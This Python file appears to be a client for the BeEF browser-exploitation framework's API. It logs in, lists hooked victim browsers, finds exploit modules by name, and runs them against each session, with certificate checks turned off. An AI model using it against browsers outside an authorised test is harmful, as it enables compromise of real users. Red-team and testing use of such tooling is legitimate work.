import requests
import urllib3


urllib3.disable_warnings()


API_LOGIN = "%s/api/admin/login"
API_HOOKED_SESSIONS = "%s/api/hooks?token=%s"
API_LIST_COMMANDS = "%s/api/modules?token=%s"
API_EXECUTE_MODULE = "%s/api/modules/%s/%s?token=%s"


class BeefAPI:
    def __init__(self, host):
        self.host = host
        self.token = None

    def login(self, username, password):
        response = requests.post(API_LOGIN % self.host,
                                 json={"username": username, "password": password}, verify=False)
        data = response.json()
        self.token = data["token"]

    def get_online_sessions(self):
        response = requests.get(API_HOOKED_SESSIONS % (self.host, self.token),
                                verify=False)
        data = response.json()
        return data["hooked-browsers"]["online"]

    def get_exploits_of_names(self, names):
        response = requests.get(API_LIST_COMMANDS % (self.host, self.token),
                                verify=False)
        data = response.json()
        target_exploits = {}
        for exploit in data.values():
            if exploit["name"] in names:
                target_exploits[exploit["name"]] = exploit
        return target_exploits

    def execute_exploit(self, session_ids, exploit_id, options=None):
        for session_id in session_ids:
            response = requests.post(API_EXECUTE_MODULE % (self.host, session_id, exploit_id, self.token),
                                     json=options if options != None else {}, verify=False)
            print(response.json())
